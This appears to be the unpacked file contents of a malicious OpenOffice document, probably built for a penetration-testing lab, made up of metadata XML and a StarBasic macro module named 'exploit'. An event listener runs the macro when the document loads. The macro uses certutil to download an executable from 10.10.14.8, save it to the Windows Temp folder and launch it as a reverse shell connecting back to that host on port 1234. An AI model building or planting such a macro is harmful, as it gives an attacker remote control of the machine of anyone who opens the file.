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loit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exploit.OnLoad?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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3T19:05:09</meta:creation-date>
    <dc:date>2023-09-04T18:08:17.12</dc:date>
    <meta:editing-duration>PT39M29S</meta:editing-duration>
    <meta:editing-cycles>15</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.14$Win32 OpenOffice.org_project/4114m1$Build-9811</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="0" meta:word-count="0" meta:character-count="0"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/exploit.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="exploit" script:language="StarBasic">REM  *****  BASIC  *****

	Sub OnLoad
		Shell("cmd /c certutil.exe -urlcache -split -f http://10.10.14.8/beacon.exe C:\Windows\Temp\beacon.exe &amp;&amp; C:\Windows\Temp\beacon.exe -e cmd 10.10.14.8 1234")
	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loi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